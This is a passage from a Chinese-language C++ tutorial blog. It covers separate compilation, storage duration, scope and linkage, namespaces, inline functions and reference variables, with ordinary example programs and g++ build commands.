#include 指令，将头文件的内容插入到源文件中。 编译器将处理后的源代码翻译成机器码，生成一个目标文件 (.obj 或 .o)。 链接 (Linking): 链接器 (Linker) 将所有由编译器生成的目标文件以及可能需要的库文件（包含预编译代码，如标准库）组合在一起。 链接器负责解析目标文件之间的交叉引用（例如，main.cpp 调用了在 utils.cpp 中定义的函数）。 如果所有引用都能找到对应的定义，并且没有重定义等错误，链接器就会生成最终的可执行文件（如 .exe 文件）。 示例假设我们创建一个简单的项目，包含一个计算功能的工具函数。 1. 头文件 (utils.h) 包含函数声明和包含卫哨。 12345678// filepath: d:\\ProgramData\\files_Cpp\\250424\\utils.h#ifndef UTILS_H_#define UTILS_H_// 函数原型 (声明)int add(int a, int b);#endif // UTILS_H_ 2. 源文件 (utils.cpp) 包含函数的具体实现。它需要包含自己的头文件以确保声明和定义匹配。 1234567// filepath: d:\\ProgramData\\files_Cpp\\250424\\utils.cpp#include &quot;utils.h&quot; // 包含头文件// 函数定义 (实现)int add(int a, int b) &#123; return a + b;&#125; 3. 主程序文件 (main.cpp) 使用 utils.h 中声明的函数。 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\main.cpp#include &lt;iostream&gt;#include &quot;utils.h&quot; // 包含头文件以使用 add 函数int main() &#123; int x = 5; int y = 3; int sum = add(x, y); // 调用在 utils.cpp 中定义的函数 std::cout &lt;&lt; &quot;The sum of &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y &lt;&lt; &quot; is: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; 构建过程: 编译 utils.cpp: compiler utils.cpp -&gt; utils.obj 编译 main.cpp: compiler main.cpp -&gt; main.obj 链接: linker main.obj utils.obj -&gt; myprogram.exe (或类似名称) 声明 vs. 定义: 理解声明和定义的区别对于单独编译至关重要： 声明 (Declaration): 告诉编译器某个东西（函数、变量、类等）的存在及其接口（名称、类型、参数等）。一个声明可以出现多次（只要它们一致）。头文件主要包含声明。 定义 (Definition): 提供了某个东西的具体实现或内存分配。对于非内联函数和非静态数据成员，一个定义在一个程序中只能出现一次（单一定义规则 - One Definition Rule, ODR）。源文件主要包含定义。 头文件充当了不同源文件之间的“契约”，确保它们对共享的函数和类有共同的理解，而链接器则负责将这些部分最终组装在一起。 9.2 存储持续性、作用域和链接性C++ 使用多种方案来管理内存中的数据。了解这些方案对于理解变量和函数的生命周期、可见性以及它们如何在不同文件间共享至关重要。主要涉及三个核心概念： 存储持续性 (Storage Duration): 决定了对象（变量）在内存中保留多长时间。 作用域 (Scope): 描述了标识符（变量名、函数名等）在程序代码中的可见范围。 链接性 (Linkage): 决定了在不同编译单元（.cpp 文件）中声明的同名标识符是否指向同一个实体。 C++ 主要有以下几种存储持续性： 自动存储持续性 (Automatic Storage Duration): 对象在程序执行进入其定义所在的代码块时创建，在退出该代码块时销毁。通常在函数内部定义的变量（非 static）属于这种。内存通常在栈 (stack) 上分配。 静态存储持续性 (Static Storage Duration): 对象在程序启动时创建（或首次使用前），在整个程序运行期间都存在，直到程序结束时才销毁。全局变量、文件作用域的 static 变量、函数内部的 static 变量都属于这种。 线程存储持续性 (Thread Storage Duration) (C++11): 对象与特定线程的生命周期绑定。使用 thread_local 说明符声明。 动态存储持续性 (Dynamic Storage Duration): 对象通过 new 运算符在程序的自由存储区（堆, heap）上显式创建，并通过 delete 运算符显式销毁。其生命周期由程序员控制。 9.2.1 作用域和链接作用域 (Scope) 定义了标识符有效的代码区域。C++ 中的主要作用域包括： 块作用域 (Block Scope): 标识符在代码块（由 &#123;&#125; 包围）内可见，从声明点开始到代码块结束。函数内部的变量、循环变量等具有块作用域。 函数作用域 (Function Scope): 仅用于 goto 语句的标签，标签在整个函数内部都可见。 函数原型作用域 (Function Prototype Scope): 函数原型参数列表中的标识符仅在原型声明内部可见。 文件作用域 (File Scope) / 全局作用域 (Global Scope) / 名称空间作用域 (Namespace Scope): 在所有函数或类外部定义的标识符具有文件作用域（或更准确地说是名称空间作用域，全局作用域是默认的全局名称空间）。它们从声明点开始到文件末尾都可见。 类作用域 (Class Scope): 类成员（数据成员和成员函数）具有类作用域，在类定义内部以及通过对象、引用或指针访问时可见。 链接性 (Linkage) 描述了名称如何在不同的编译单元（.cpp 文件）之间共享。 无链接性 (No Linkage): 名称只在定义它的作用域内有效，不能被其他作用域或编译单元访问。具有块作用域的变量（包括函数内部的 static 变量）通常没有链接性。 内部链接性 (Internal Linkage): 名称可以在定义它的单个编译单元内的所有作用域中共享，但不能被其他编译单元访问。在文件作用域（全局或命名空间）使用 static 关键字声明的变量和函数，以及匿名命名空间中的实体具有内部链接性。 外部链接性 (External Linkage): 名称可以在多个编译单元之间共享。在文件作用域（全局或命名空间）声明的非 static 函数、非 static 非 const 全局变量、extern const 全局变量以及类等具有外部链接性。 9.2.2 自动存储持续性这是最常见的存储方式，适用于函数内部定义的局部变量（未使用 static、extern 或 thread_local）。 存储持续性: 自动。进入代码块时创建，退出时销毁。 作用域: 块作用域。 链接性: 无链接性。 123456789101112131415161718192021#include &lt;iostream&gt;void my_func() &#123; int auto_var = 10; // 自动变量 std::cout &lt;&lt; &quot;Inside my_func: auto_var = &quot; &lt;&lt; auto_var &lt;&lt; std::endl; auto_var++; // 修改只在本次调用有效&#125; // auto_var 在这里被销毁int main() &#123; int main_var = 5; // main 函数的自动变量 if (main_var &gt; 0) &#123; double block_var = 3.14; // 块作用域的自动变量 std::cout &lt;&lt; &quot;Inside if block: block_var = &quot; &lt;&lt; block_var &lt;&lt; std::endl; &#125; // block_var 在这里被销毁 // std::cout &lt;&lt; block_var; // 错误！block_var 在此作用域不可见 my_func(); // 调用 my_func，创建并销毁其 auto_var my_func(); // 再次调用，创建新的 auto_var，其值仍是 10 return 0;&#125; 9.2.3 静态持续变量静态持续变量在程序整个运行期间都存在。根据链接性不同，它们有不同的用途和可见性。 9.2.4 静态持续性、外部链接性这些变量（有时称为全局变量）可以在程序的多个文件中共享。 定义: 在所有函数外部定义，且未使用 static 关键字。 存储持续性: 静态。 作用域: 文件作用域（从定义点到文件尾）。 链接性: 外部链接性。 初始化: 如果未显式初始化，会被自动初始化为零（或对应类型的零值）。 共享: 要在其他文件中使用，需要使用 extern 关键字进行声明（不是定义）。 示例: 1234567891011121314// file1.cpp#include &lt;iostream&gt;// 定义具有外部链接性的全局变量double global_data = 3.14; // 显式初始化int count; // 隐式初始化为 0void increment_count() &#123; count++;&#125;void display_data() &#123; std::cout &lt;&lt; &quot;In file1: global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl;&#125; 1234567891011121314151617181920212223// file2.cpp#include &lt;iostream&gt;// 声明 file1 中定义的全局变量 (使用 extern)extern double global_data;extern int count;// 声明 file1 中定义的函数 (函数声明默认 extern)void increment_count();void display_data();void use_globals() &#123; std::cout &lt;&lt; &quot;In file2 (before increment): global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl; increment_count(); // 调用 file1 中的函数，修改 file1 中的 count std::cout &lt;&lt; &quot;In file2 (after increment): global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl;&#125;int main() &#123; display_data(); // 调用 file1 的函数 use_globals(); // 调用 file2 的函数 display_data(); // 再次调用 file1 的函数，查看 count 的变化 return 0;&#125; 编译和链接: 12g++ file1.cpp file2.cpp -o myprogram./myprogram 输出: 1234In file1: global_data &#x3D; 3.14, count &#x3D; 0In file2 (before increment): global_data &#x3D; 3.14, count &#x3D; 0In file2 (after increment): global_data &#x3D; 3.14, count &#x3D; 1In file1: global_data &#x3D; 3.14, count &#x3D; 1 注意: 过度使用具有外部链接性的全局变量会增加模块间的耦合度，使程序难以理解和维护，应尽量避免。 9.2.5 静态持续性、内部链接性这些变量和函数的作用域限制在单个编译单元（.cpp 文件）内，有助于避免不同文件间的命名冲突。 定义: 在所有函数外部定义，并使用 static 关键字。或者定义在匿名命名空间中。 存储持续性: 静态。 作用域: 文件作用域。 链接性: 内部链接性。 初始化: 同外部链接性变量，默认为零值。 共享: 不能被其他编译单元通过 extern 访问。 示例: 12345678910111213141516// service.cpp#include &lt;iostream&gt;// 具有内部链接性的静态全局变量static int service_counter = 0; // 只在 service.cpp 可见// 具有内部链接性的静态函数static void internal_helper() &#123; std::cout &lt;&lt; &quot;Internal helper called.&quot; &lt;&lt; std::endl;&#125;void provide_service() &#123; internal_helper(); service_counter++; std::cout &lt;&lt; &quot;Service provided. Counter: &quot; &lt;&lt; service_counter &lt;&lt; std::endl;&#125; 123456789101112131415// main.cpp#include &lt;iostream&gt;// 声明 service.cpp 中的函数 (具有外部链接性)void provide_service();// extern int service_counter; // 错误！无法访问内部链接性的变量// static void internal_helper(); // 错误！无法访问内部链接性的函数int main() &#123; provide_service(); provide_service(); // std::cout &lt;&lt; service_counter; // 错误！ return 0;&#125; 编译和链接: 12g++ service.cpp main.cpp -o myapp./myapp 输出: 1234Internal helper called.Service provided. Counter: 1Internal helper called.Service provided. Counter: 2 匿名命名空间 (Unnamed/Anonymous Namespace): C++ 提供匿名命名空间作为 static 用于内部链接性的更好替代方案。在匿名命名空间中声明的所有内容都具有内部链接性。 123456789101112131415// service_v2.cpp#include &lt;iostream&gt;namespace &#123; // 匿名命名空间 int service_counter_v2 = 0; // 内部链接性 void internal_helper_v2() &#123; // 内部链接性 std::cout &lt;&lt; &quot;Internal helper v2 called.&quot; &lt;&lt; std::endl; &#125;&#125; // end anonymous namespacevoid provide_service_v2() &#123; internal_helper_v2(); service_counter_v2++; std::cout &lt;&lt; &quot;Service v2 provided. Counter: &quot; &lt;&lt; service_counter_v2 &lt;&lt; std::endl;&#125; 9.2.6 静态存储持续性、无链接性这种变量在函数内部声明，但使用 static 关键字。 定义: 在代码块（通常是函数）内部，使用 static 关键字。 存储持续性: 静态。它们在程序启动时或第一次执行到其定义时创建，并在整个程序生命周期内存在。 作用域: 块作用域。它们只能在定义它们的代码块内部按名称访问。 链接性: 无链接性。 初始化: 只在程序执行第一次到达其定义时初始化一次。如果未显式初始化，默认为零值。 特性: 它们在函数调用之间保持其值。 示例: 123456789101112131415#include &lt;iostream&gt;void record_call() &#123; static int call_count = 0; // 静态局部变量，只初始化一次 call_count++; std::cout &lt;&lt; &quot;Function record_call has been called &quot; &lt;&lt; call_count &lt;&lt; &quot; times.&quot; &lt;&lt; std::endl;&#125;int main() &#123; record_call(); record_call(); record_call(); // std::cout &lt;&lt; call_count; // 错误！call_count 在 main 中不可见 return 0;&#125; 输出: 123Function record_call has been called 1 times.Function record_call has been called 2 times.Function record_call has been called 3 times. 9.2.7 说明符和限定符C++ 提供了一些关键字来修改变量或函数的存储持续性、链接性或行为： static: 用于文件作用域：指定内部链接性。 用于块作用域：指定静态存储持续性（和无链接性）。 用于类成员：表示成员属于类本身，而不是类的特定对象（将在类章节详细介绍）。 extern: 用于变量：声明一个在别处（通常是另一个文件）定义的具有外部链接性的变量。它不创建变量，只是告诉编译器该变量存在。 extern &quot;C&quot;: 指定语言链接性（见 9.2.9）。 const: 限定符，表示变量的值不能被修改。 const 全局变量默认具有内部链接性。要使其具有外部链接性，必须使用 extern const 声明，并在定义时也加上 extern。 123456789// header.hextern const int MAX_USERS; // 声明外部链接的 const// config.cppextern const int MAX_USERS = 100; // 定义外部链接的 const// utils.cpp#include &quot;header.h&quot;void check_users() &#123; if (user_count &gt; MAX_USERS) &#123; /*...*/ &#125; &#125; 或者，更常见的做法是将 const 定义在头文件中（因为它默认内部链接，不会引起重定义问题），或者使用 C++11 的 constexpr。 thread_local (C++11): 指定线程存储持续性。每个线程将拥有该变量的独立副本。 volatile: 限定符，告诉编译器变量的值可能在程序代码未显式修改的情况下发生改变（例如，由硬件或其他并发线程修改）。编译器不会对 volatile 变量进行某些优化（如缓存到寄存器）。 mutable: 限定符，仅用于类的数据成员。允许在 const 成员函数中修改被 mutable 修饰的成员变量。 9.2.8 函数和链接性函数默认具有外部链接性，这意味着在一个文件中定义的函数可以在其他文件中声明和调用。 1234567// math_utils.cppdouble square(double x) &#123; return x * x; &#125; // 外部链接性 (默认)// main.cpp#include &lt;iostream&gt;double square(double x); // 声明 (默认 extern)int main() &#123; std::cout &lt;&lt; square(5.0) &lt;&lt; std::endl; return 0; &#125; 可以使用 static 关键字将函数的链接性改为内部链接性，使其仅在定义的 .cpp 文件内可见。 1234567891011// helper.cpp#include &lt;iostream&gt;static void internal_print(const char* msg) &#123; // 内部链接性 std::cout &lt;&lt; &quot;[Internal] &quot; &lt;&lt; msg &lt;&lt; std::endl;&#125;void public_helper() &#123; internal_print(&quot;Public helper called&quot;); &#125;// main.cppvoid public_helper();// static void internal_print(const char*); // 错误！无法访问int main() &#123; public_helper(); return 0; &#125; 9.2.9 语言链接性C++ 程序有时需要调用用其他语言（主要是 C 语言）编写的函数。由于 C++ 支持函数重载（通过名称修饰），而 C 语言不支持，直接链接可能会失败。语言链接性 (Language Linkage) 机制允许指定函数应遵循哪种语言的链接约定。 最常用的是 extern &quot;C&quot;，它指示编译器使用 C 语言的链接约定（通常只是函数名本身，没有修饰）。 用法: 单个函数: 1extern &quot;C&quot; void c_style_function(int); 多个函数块: 12345extern &quot;C&quot; &#123; #include &lt;stdio.h&gt; // 包含 C 头文件 int c_function1(double); void c_function2(const char*);&#125; 当在 C++ 代码中包含 C 语言的头文件时，这些头文件通常已经使用了 extern &quot;C&quot;（通过条件编译 __cplusplus 宏）来确保 C++ 编译器能正确链接其中的函数。 1234567891011// C 头文件 my_c_lib.h 可能包含类似结构#ifdef __cplusplusextern &quot;C&quot; &#123;#endifvoid c_api_call(int);// ... 其他 C 函数声明 ...#ifdef __cplusplus&#125; // extern &quot;C&quot;#endif 9.2.10 存储方案和动态分配总结一下主要的存储方案： 自动存储: 栈内存，生命周期与代码块绑定，自动管理。 静态存储: 程序生命周期内存在，根据链接性（外部、内部、无）决定可见性。 线程存储: 生命周期与线程绑定。 动态存储: 堆内存（自由存储区），生命周期由 new 和 delete 手动管理。 动态分配 (new/delete) 提供了最大的灵活性，允许在运行时根据需要创建和销毁对象，但同时也带来了手动管理内存的责任，容易出错（如内存泄漏、悬挂指针）。后续章节将更详细地探讨动态内存管理，特别是与类结合使用时。 9.3 名称空间随着项目越来越大，或者当你需要使用来自不同开发者的代码库时，可能会遇到一个问题：名称冲突。例如，你可能定义了一个名为 List 的类，而另一个库也定义了一个同名的 List 类。当你在同一个程序中使用这两个类时，编译器就无法区分你指的是哪个 List。 为了解决这个问题，C++引入了名称空间 (Namespace) 的概念。名称空间提供了一种将全局作用域划分为不同逻辑部分的方法，每个部分包含一组相关的名称（如变量、函数、类等）。 9.3.1 传统的C++名称空间在名称空间特性被引入之前，C++只有一个**全局名称空间 (Global Namespace)**。所有在任何函数、类或结构外部声明的名称都属于全局名称空间。大型项目中，这很容易导致名称冲突，特别是当包含多个第三方库时。 开发者有时会使用一些约定来模拟名称空间，例如给所有相关的名称添加特定的前缀（如 mylib_List），但这并不是一个完美的解决方案。 9.3.2 新的名称空间特性C++标准引入了 namespace 关键字来显式地创建具名的名称空间。 定义名称空间: 12345678910namespace mycode &#123; // 在这里声明和定义变量、函数、类等 int value = 10; void printValue() &#123; std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; std::endl; &#125; class MyClass &#123; // ... &#125;;&#125; // namespace mycode 访问名称空间成员: 有三种主要方法可以访问名称空间中的成员： 作用域解析运算符 :: (Scope Resolution Operator): 使用名称空间名称和 :: 来限定成员名。这是最安全的方式，因为它明确指出了使用的是哪个名称空间的成员。 12345678910#include &lt;iostream&gt;namespace mycode &#123; int value = 10;&#125;int main() &#123; std::cout &lt;&lt; mycode::value &lt;&lt; std::endl; // 输出 10 return 0;&#125; using 声明 (Using Declaration): 使特定的名称空间成员可用，就像它是在当前作用域声明的一样。 123456789101112131415#include &lt;iostream&gt;namespace mycode &#123; int value = 10; double score = 9.5;&#125;int main() &#123; using mycode::value; // 只让 value 可用 std::cout &lt;&lt; value &lt;&lt; std::endl; // 输出 10 (直接访问) // std::cout &lt;&lt; score &lt;&lt; std::endl; // 错误！score 未声明 std::cout &lt;&lt; mycode::score &lt;&lt; std::endl; // 需要限定符 return 0;&#125; using 指令 (Using Directive): 使整个名称空间的所有成员都可用。这比较方便，但也可能重新引入名称冲突的问题，应谨慎使用，尤其是在头文件中。 123456789101112131415#include &lt;iostream&gt;namespace mycode &#123; int value = 10; double score = 9.5;&#125;// 使用 using 指令使 mycode 的所有成员可用using namespace mycode;int main() &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; // 输出 10 (直接访问) std::cout &lt;&lt; score &lt;&lt; std::endl; // 输出 9.5 (直接访问) return 0;&#125; std 名称空间: C++标准库的所有组件（如 cout, cin, string, vector 等）都被定义在 std 名称空间中。这就是为什么我们通常需要写 std::cout 或者在文件开头使用 using namespace std; 或 using std::cout;。 未命名的名称空间 (Unnamed Namespaces): 你也可以创建未命名的名称空间。这类似于使用 static 关键字声明具有内部链接性的全局变量或函数。未命名名称空间中的成员只能在当前文件内访问。 1234567891011namespace &#123; // 这些成员只在当前文件可见 int internal_count = 0; void increment() &#123; internal_count++; &#125;&#125;// 在同一文件中可以访问// increment();// std::cout &lt;&lt; internal_count &lt;&lt; std::endl; 9.3.3 名称空间示例下面是一个更完整的示例，展示了如何定义和使用多个名称空间： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;string&gt; // std 命名空间中的 string 类// 第一个名称空间namespace first_space &#123; void display() &#123; std::cout &lt;&lt; &quot;Inside first_space&quot; &lt;&lt; std::endl; &#125; int count = 1;&#125;// 第二个名称空间namespace second_space &#123; void display() &#123; std::cout &lt;&lt; &quot;Inside second_space&quot; &lt;&lt; std::endl; &#125; int count = 2;&#125;int main() &#123; // 使用作用域解析运算符 first_space::display(); // 输出: Inside first_space second_space::display(); // 输出: Inside second_space std::cout &lt;&lt; &quot;first_space::count = &quot; &lt;&lt; first_space::count &lt;&lt; std::endl; // 输出: 1 std::cout &lt;&lt; &quot;second_space::count = &quot; &lt;&lt; second_space::count &lt;&lt; std::endl; // 输出: 2 // 使用 using 声明 &#123; // 创建一个新的作用域 using first_space::display; display(); // 调用 first_space::display() &#125; // 使用 using 指令 (通常建议在函数内部或特定作用域内使用) &#123; // 创建一个新的作用域 using namespace second_space; display(); // 调用 second_space::display() std::cout &lt;&lt; &quot;count from second_space = &quot; &lt;&lt; count &lt;&lt; std::endl; // 访问 second_space::count &#125; // std 命名空间的使用 std::string message = &quot;Hello from std namespace!&quot;; std::cout &lt;&lt; message &lt;&lt; std::endl; return 0;&#125; 9.3.4 名称空间及其前途名称空间是现代C++编程不可或缺的一部分。它们是组织代码、避免名称冲突以及管理大型项目复杂性的关键工具。 库开发: 几乎所有的现代C++库都将其组件放在一个或多个名称空间中，以防止与使用该库的代码或其他库发生冲突。std 是最典型的例子。 项目组织: 在大型项目中，开发者经常使用名称空间来划分代码的不同模块或功能区域。 避免全局污染: 使用名称空间可以减少全局作用域中的名称数量，使代码更清晰、更易于维护。 最佳实践: **优先使用作用域解析运算符 (::)**：这是最明确、最不易出错的方式。 在 .cpp 文件或函数内部使用 using 声明或指令：避免在头文件（.h 或 .hpp）的顶层使用 using 指令，因为它会影响所有包含该头文件的文件，可能导致意想不到的名称冲突。 将自己的代码放入名称空间：这是一个良好的编程习惯，特别是当你编写可能被他人重用的代码时。 理解和正确使用名称空间对于编写健壮、可维护的C++代码至关重要。 9.4 总结本章探讨了C++如何管理程序中的内存和名称，特别是在涉及多个文件的大型项目中。这些机制对于编写结构清晰、可维护且可扩展的C++代码至关重要。 主要内容回顾： 单独编译 (Separate Compilation): C++允许将程序分解为多个源文件（.cpp）和头文件（.h 或 .hpp）。源文件包含函数的具体实现或变量的定义，而头文件通常包含声明（如函数原型、类定义、常量声明、模板等）。每个源文件可以被独立编译成目标文件（.obj 或 .o），最后由链接器将这些目标文件以及所需的库文件组合成最终的可执行程序。这种方式提高了编译效率，并使得代码模块化和重用更加方便。 存储持续性、作用域和链接性 (Storage Duration, Scope, and Linkage): 存储持续性决定了变量或对象在内存中存在的时间。主要有：自动存储（函数内定义的局部变量，随函数调用创建和销毁）、静态存储（程序运行期间一直存在，如全局变量或用 static 修饰的变量）、线程存储（C++11引入，与特定线程生命周期相关）和动态存储（使用 new 分配，delete 释放）。 作用域定义了程序中可以访问一个名称（变量、函数等）的区域。主要有：块作用域（&#123;&#125;内部）、函数作用域（仅用于 goto 标签）、函数原型作用域（仅用于参数名）、文件作用域（全局作用域）和类作用域。 链接性决定了在不同文件或编译单元中声明的同名标识符是否指向同一个实体。主要有：外部链接（可在多个文件中共享，如普通全局变量和函数）、内部链接（仅在当前文件内可见，如用 static 修饰的全局变量/函数或未命名空间中的成员）和无链接（如局部变量）。extern 关键字可用于引用其他文件中具有外部链接的变量。 名称空间 (Namespaces): 为了解决大型项目中可能出现的名称冲突问题（例如，不同库定义了同名的函数或类），C++引入了名称空间。 使用 namespace 关键字可以创建具名的代码区域。 访问名称空间成员可以通过作用域解析运算符 ::（如 std::cout）、using 声明（如 using std::cout;）或 using 指令（如 using namespace std;）。 C++标准库的所有功能都位于 std 名称空间中。 未命名的名称空间提供了一种创建具有内部链接性的实体的方法，是替代文件作用域 static 的现代方式。 掌握这些概念有助于更好地组织代码，理解变量和函数的生命周期与可见性，并有效避免名称冲突，从而构建更健壮、更模块化的C++应用程序。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 8 函数进阶","slug":"Cpp_tutorial_Chapter_8","date":"2025-04-26T12:03:35.389Z","updated":"2025-04-26T12:02:12.619Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_8/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_8/","excerpt":"","text":"8.1 C++ 内联函数常规的函数调用过程涉及一些开销：程序需要跳转到函数的内存地址，保存当前执行状态（如寄存器值），将参数复制到栈上，执行函数代码，存储返回值，恢复执行状态，然后跳转回调用点。对于非常短小且频繁调用的函数，这些开销可能会变得显著，影响程序性能。 内联函数 (Inline Function) 是 C++ 提供的一种优化机制，旨在减少这种函数调用开销。其基本思想是：建议编译器在编译时将函数的实际代码直接替换到每个调用该函数的地方，而不是执行常规的函数调用跳转。 用法要建议编译器将一个函数视为内联函数，可以在函数定义前加上 inline 关键字。 语法: 123inline return_type function_name(parameter_list) &#123; // 函数体&#125; 示例: 123456789101112131415161718192021#include &lt;iostream&gt;// 定义一个简单的内联函数inline double square(double x) &#123; return x * x;&#125;int main() &#123; double a = 5.0; double b; // 调用内联函数 b = square(a); // 编译器可能会将这里替换为: b = a * a; std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; &quot;, a squared = &quot; &lt;&lt; b &lt;&lt; std::endl; double c = square(1.5 + 2.5); // 编译器可能会替换为: double c = (1.5 + 2.5) * (1.5 + 2.5); std::cout &lt;&lt; &quot;(1.5 + 2.5) squared = &quot; &lt;&lt; c &lt;&lt; std::endl; return 0;&#125; 代码解释: square 函数被声明为 inline。 在 main 函数中调用 square(a) 时，编译器可能会直接用 a * a 的代码替换这次调用，避免了函数调用的开销。 同样，square(1.5 + 2.5) 可能被替换为 (1.5 + 2.5) * (1.5 + 2.5)。 inline 的特性和注意事项 建议而非命令: inline 关键字只是向编译器提出的一个建议。编译器会根据自己的优化策略来决定是否真的进行内联。如果函数体过于复杂（例如包含循环、递归、大量代码），或者编译器认为内联不会带来好处（甚至可能有害），它可能会忽略 inline 建议，仍然执行常规的函数调用。 适用于小型函数: 内联最适合那些代码量小、执行速度快且被频繁调用的函数。如果内联一个大函数，可能会导致最终生成的可执行代码体积显著增大（代码膨胀），反而降低性能（因为更大的代码可能导致更多的缓存未命中）。 定义位置: 为了让编译器能够在调用点展开函数代码，内联函数的定义（而不仅仅是原型）通常需要放在调用该函数的每个源文件中。最常见的做法是将内联函数的定义直接放在头文件中。这样，包含该头文件的所有源文件都能看到完整的函数定义，编译器就有机会进行内联。 注意：将函数定义放在头文件中对于非内联函数通常是错误的（会导致链接错误，因为同一个函数会在多个编译单元中定义），但对于内联函数是允许且必要的。 类定义中的函数: 在类（class 或 struct）定义内部实现的成员函数默认就是内联的，不需要显式添加 inline 关键字。 123456class MyClass &#123;public: int getValue() const &#123; return value; &#125; // 默认是内联的private: int value;&#125;; 内联函数 vs. 宏 (#define)在 C 语言中，有时会使用带参数的宏（#define）来模拟类似内联函数的效果，以避免函数调用开销。例如： 1#define SQUARE(X) ((X)*(X)) // C 风格宏 然而，宏存在一些缺点： 类型不安全: 宏只是简单的文本替换，不进行类型检查。 意外的副作用: 如果参数带有副作用（如 SQUARE(i++)），可能会导致意想不到的结果，因为参数会被多次求值 (((i++)*(i++))）。 调试困难: 宏在预处理阶段就被替换掉了，调试器通常看不到宏的原始形式。 作用域问题: 宏不受 C++ 的作用域规则约束。 内联函数克服了这些缺点： 类型安全: 内联函数遵循正常的函数类型检查规则。 参数求值: 参数只会被求值一次。 可调试: 内联函数仍然是真正的函数，可以用调试器进行调试（尽管内联后的代码可能看起来不同）。 遵循作用域: 内联函数遵循 C++ 的作用域和访问规则。 因此，在 C++ 中，应优先使用内联函数而不是带参数的宏来实现简单的、需要避免调用开销的功能。 总结: 内联函数是 C++ 提供的一种性能优化建议，通过在编译时将函数代码替换到调用点来减少函数调用开销。它特别适用于短小且频繁调用的函数。inline 关键字只是一个建议，编译器有最终决定权。为了使内联成为可能，通常需要将内联函数的定义放在头文件中。相比 C 风格的宏，内联函数提供了类型安全和更可预测的行为。 8.2 引用变量C++ 引入了一种新的复合类型——引用 (Reference)**。引用是已定义变量的别名 (alias)**。它提供了一种间接访问变量的方式，但语法比指针更简洁。一旦引用被初始化指向一个变量，它就不能再引用其他变量，并且对引用的所有操作实际上都作用于它所引用的原始变量。 8.2.1 创建引用变量引用变量在声明时必须被初始化，并且其类型必须与它所引用的变量类型相匹配。 语法: 1type&amp; reference_name = existing_variable; type: 变量的类型。 &amp;: 引用声明符，紧跟在类型名之后。 reference_name: 引用的名称。 existing_variable: 引用所指向的已存在的变量。 示例: 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; int rats = 101; int&amp; rodents = rats; // rodents 是 rats 的一个引用 (别名) std::cout &lt;&lt; &quot;rats = &quot; &lt;&lt; rats; std::cout &lt;&lt; &quot;, rodents = &quot; &lt;&lt; rodents &lt;&lt; std::endl; // 输出: rats = 101, rodents = 101 // 对引用进行操作，实际上是操作原始变量 rodents++; std::cout &lt;&lt; &quot;After rodents++:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;rats = &quot; &lt;&lt; rats; // rats 的值也变成了 102 std::cout &lt;&lt; &quot;, rodents = &quot; &lt;&lt; rodents &lt;&lt; std::endl; // 输出: rats = 102, rodents = 102 // 查看地址，会发现它们是相同的 std::cout &lt;&lt; &quot;Address of rats: &quot; &lt;&lt; &amp;rats &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of rodents: &quot; &lt;&lt; &amp;rodents &lt;&lt; std::endl; // 输出相同的地址 // int&amp; bad_ref; // 错误！引用必须在声明时初始化 // double&amp; wrong_type = rats; // 错误！类型不匹配 (double&amp; vs int) return 0;&#125; 关键点: 引用必须在声明时初始化。 引用一旦初始化，就不能再指向其他变量。它终生都是其初始变量的别名。 引用本身不占用独立的内存地址（或者说，它的地址就是它所引用变量的地址）。 8.2.2 将引用用作函数参数引用最重要和最常见的用途之一是作为函数参数，这称为**按引用传递 (Pass by Reference)**。当使用引用作为函数参数时，函数接收的是原始变量的别名，而不是副本。这意味着函数可以直接访问并修改调用者作用域中的原始变量。 语法: 123void function_name(type&amp; ref_parameter) &#123; // 可以通过 ref_parameter 修改原始实参&#125; 示例：使用引用参数交换两个变量的值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;// 函数：使用引用参数交换两个 int 变量的值void swap_ref(int&amp; a, int&amp; b) &#123; // a 和 b 是调用时传入变量的别名 int temp = a; a = b; b = temp; // 对 a 和 b 的修改直接影响原始变量&#125;// 对比：使用指针参数交换 (传统 C 风格)void swap_ptr(int* p_a, int* p_b) &#123; int temp = *p_a; *p_a = *p_b; *p_b = temp;&#125;// 对比：使用值传递 (无法交换原始变量)void swap_val(int a, int b) &#123; int temp = a; a = b; b = temp; // 只修改了局部副本 a 和 b&#125;int main() &#123; int wallet1 = 100; int wallet2 = 200; std::cout &lt;&lt; &quot;Original: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 尝试使用值传递交换 (失败) swap_val(wallet1, wallet2); std::cout &lt;&lt; &quot;After swap_val: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 值不变 // 使用引用传递交换 (成功) swap_ref(wallet1, wallet2); std::cout &lt;&lt; &quot;After swap_ref: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 值已交换 // 再次交换回来，使用指针传递 (成功) swap_ptr(&amp;wallet1, &amp;wallet2); // 注意需要传递地址 std::cout &lt;&lt; &quot;After swap_ptr: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 值再次交换回来 return 0;&#125; 按引用传递 vs. 按指针传递: 